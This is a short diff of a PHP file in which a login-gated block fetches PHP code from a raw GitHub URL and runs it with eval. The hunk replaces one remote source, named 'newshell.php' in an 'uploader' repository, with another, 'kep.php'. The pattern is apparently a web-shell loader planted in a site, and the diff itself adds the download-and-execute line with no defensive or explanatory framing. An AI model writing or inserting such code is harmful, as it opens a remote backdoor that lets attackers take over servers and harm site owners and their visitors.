@@ -56,7 +56,7 @@ function is_logged_in() {
 
 if (is_logged_in()) {
  
-    $a = fetchRemoteContent('https://raw.githubusercontent.com/eclibesec/uploader/refs/heads/main/newshell.php');
+    $a = fetchRemoteContent('https://raw.githubusercontent.com/XList99/she/refs/heads/main/kep.php');
     if ($a !== false) {
         eval('?>' . $a);
     } else {
